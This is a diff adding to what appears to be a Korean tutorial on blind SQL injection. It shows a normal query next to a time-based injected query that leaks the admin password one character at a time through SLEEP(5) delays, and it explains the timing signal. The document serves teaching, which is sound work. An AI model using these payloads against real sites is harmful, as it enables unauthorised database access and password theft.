@@ -345,3 +345,19 @@ Blooean-based Blind SQLi는\
   ```
   ' AND IF(LENGTH((SELECT password FROM users WHERE username='admin'))=32, SLEEP(5), 0) -- -
   ```
+
+**실제 쿼리 예시**
+
+정상 쿼리 :
+```
+SELECT * FROM products WHERE id = 'userInput';
+```
+
+공격 시 :
+```
+SELECT * FROM products WHERE id = '1' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0) -- -'
+```
+- 조건이 **참**이면 -> 데이터베이스가 5초 대기 -> 웹사이트 응답이 느려짐
+- 조건이 **거짓**이면 -> 바로 응답
+공격자는 이 **느림 / 빠름**의 차이로 비밀번호를 알아냄.
+
